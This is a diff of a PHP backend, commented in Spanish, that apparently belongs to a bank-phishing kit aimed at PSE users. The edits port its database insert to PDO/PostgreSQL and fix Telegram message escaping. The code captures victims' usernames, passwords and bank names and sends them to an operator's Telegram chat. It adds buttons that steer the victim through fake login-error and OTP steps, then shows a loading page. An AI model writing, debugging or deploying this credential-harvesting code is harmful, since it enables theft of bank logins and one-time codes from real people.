@@ -1,14 +1,12 @@
 <?php
 session_start();
-// Estos includes ahora funcionan juntos:
-// 1. conexion.php usa config.php para conectarse a la BBDD de Render.
-// 2. Nos da la variable $conn (como un objeto PDO).
-include '../../../../assets/config/conexion.php'; 
+include '../../../../assets/config/conexion.php';
 $config = include '../../../../assets/config/config.php';
 
-// Función para escapar caracteres especiales en MarkdownV2 (Sin cambios)
+// --- FUNCIÓN DE TELEGRAM CORREGIDA ---
+// Se añadió '\\' a la lista para evitar el error 400 Bad Request
 function escapeMarkdownV2($text) {
-    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
+    $specialChars = ['\\', '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
     foreach ($specialChars as $char) {
         $text = str_replace($char, "\\" . $char, $text);
     }
@@ -24,83 +22,87 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         die("Error: Todos los campos son obligatorios.");
     }
 
-    // --- SECCIÓN DE BASE DE DATOS ADAPTADA A PDO (PARA POSTGRESQL) ---
-    
-    $estado = 1; // Estado inicial
+    try {
+        // --- SECCIÓN DE BASE DE DATOS CORREGIDA PARA PDO ---
+        
+        // 1. PostgreSQL usa "RETURNING id" para devolver el ID
+        $sql_insert = "INSERT INTO pse (estado) VALUES (?) RETURNING id";
+        
+        $stmt_insert = $conn->prepare($sql_insert);
+        $estado = 1; // Estado inicial
+        
+        // 2. En PDO, los valores se pasan en un array a execute()
+        $stmt_insert->execute([$estado]);
+        
+        // 3. En PDO, se usa fetchColumn() para obtener el ID devuelto
+        $nuevo_id = $stmt_insert->fetchColumn(); 
 
-    // 1. Cambiamos la consulta: PostgreSQL usa "RETURNING id" para devolver el ID
-    //    después de un INSERT.
-    $sql_insert = "INSERT INTO pse (estado) VALUES (?) RETURNING id";
-
-    // 2. Preparamos la consulta (esto es igual, pero $conn es un objeto PDO)
-    $stmt_insert = $conn->prepare($sql_insert);
-    
-    // 3. Ejecutamos la consulta. En PDO, pasamos los valores como un array.
-    //    Esto reemplaza a bind_param().
-    $stmt_insert->execute([$estado]);
-    
-    // 4. Obtenemos el ID devuelto por "RETURNING id".
-    //    Esto reemplaza a $stmt_insert->insert_id (que es de MySQLi).
-    $nuevo_id = $stmt_insert->fetchColumn(); 
-
-    // No se necesita $stmt_insert->close() de esta manera con PDO.
-
-    // --- FIN DE LA SECCIÓN ADAPTADA ---
+        // 4. No se usa close() en PDO de esta manera
+        
+        // --- FIN DE LA SECCIÓN CORREGIDA ---
 
 
-    // Enviar datos a Telegram (Sin cambios)
-    $botToken = $config['telegram']['bot_token'];
-    $chatId = $config['telegram']['chat_id'];
-    $baseUrl = $config['base_url'];
-    $security_key = 'tu_clave_secreta_aqui'; // Define tu clave de seguridad aquí
+        // Enviar datos a Telegram (esta parte estaba bien)
+        $botToken = $config['telegram']['bot_token'];
+        $chatId = $config['telegram']['chat_id'];
+        $baseUrl = $config['base_url'];
+        $security_key = 'tu_clave_secreta_aqui'; 
 
-    $message = "🔐 *Nuevo inicio de sesión*\n\n"
-             . "👤 *Usuario:* `" . escapeMarkdownV2($user) . "`\n"
-             . "🔑 *Clave:* `" . escapeMarkdownV2($pass) . "`\n"
-             . "🏦 *Banco:* `" . escapeMarkdownV2($banco) . "`";
+        $message = "🔐 *Nuevo inicio de sesión*\n\n"
+                 . "👤 *Usuario:* `" . escapeMarkdownV2($user) . "`\n"
+                 . "🔑 *Clave:* `" . escapeMarkdownV2($pass) . "`\n"
+                 . "🏦 *Banco:* `" . escapeMarkdownV2($banco) . "`";
 
-    $keyboard = [
-        'inline_keyboard' => [
-            [
-                ['text' => 'Error Login', 'url' => "$baseUrl?id=$nuevo_id&estado=2&key=$security_key"]
-            ],
-            [
-                ['text' => 'Otp', 'url' => "$baseUrl?id=$nuevo_id&estado=3&key=$security_key"],
-                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$nuevo_id&estado=4&key=$security_key"]
-            ],
-            [
-                ['text' => 'Finalizar', 'url' => "$baseUrl?id=$nuevo_id&estado=0&key=$security_key"]
+        $keyboard = [
+            'inline_keyboard' => [
+                [
+                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$nuevo_id&estado=2&key=$security_key"]
+                ],
+                [
+                    ['text' => 'Otp', 'url' => "$baseUrl?id=$nuevo_id&estado=3&key=$security_key"],
+                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$nuevo_id&estado=4&key=$security_key"]
+                ],
+                [
+                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$nuevo_id&estado=0&key=$security_key"]
+                ]
             ]
-        ]
-    ];
+        ];
 
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message,
-        'parse_mode' => 'MarkdownV2',
-        'reply_markup' => json_encode($keyboard)
-    ];
+        $data = [
+            'chat_id' => $chatId,
+            'text' => $message,
+            'parse_mode' => 'MarkdownV2',
+            'reply_markup' => json_encode($keyboard)
+        ];
 
-    $options = [
-        'http' => [
-            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method'  => 'POST',
-            'content' => http_build_query($data),
-        ]
-    ];
+        $options = [
+            'http' => [
+                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+                'method'  => 'POST',
+                'content' => http_build_query($data),
+                'ignore_errors' => true // Ayuda a depurar si Telegram sigue fallando
+            ]
+        ];
 
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    $context = stream_context_create($options);
-    $result = file_get_contents($url, false, $context);
+        $url = "https://api.telegram.org/bot$botToken/sendMessage";
+        $context = stream_context_create($options);
+        $result = file_get_contents($url, false, $context);
 
-    if ($result === FALSE) {
-        $error = error_get_last();
-        file_put_contents('telegram_debug_log.txt', "Error: " . print_r($error, true), FILE_APPEND);
-        die('Error al enviar mensaje a Telegram');
+        if ($result === FALSE || strpos($http_response_header[0], "200 OK") === false) {
+            // Error al enviar
+            $error_details = $result; // El $result contendrá la respuesta de error de Telegram
+            file_put_contents('telegram_debug_log.txt', "Error: " . print_r($error_details, true) . "\nDatos enviados: " . print_r($data, true), FILE_APPEND);
+            die('Error al enviar mensaje a Telegram');
+        }
+
+        // Redirigir a la página cargando.php con el nuevo ID del cliente
+        header("Location: ../cargando.php?id=" . $nuevo_id);
+        exit();
+
+    } catch (PDOException $e) {
+        // Captura cualquier error de la base de datos (PDO)
+        error_log("Error de BBDD: " . $e->getMessage());
+        die("Error al procesar la solicitud. Intente más tarde.");
     }
-
-    // Redirigir a la página cargando.php con el nuevo ID del cliente (Sin cambios)
-    header("Location: ../cargando.php?id=" . $nuevo_id);
-    exit();
 }
 ?>
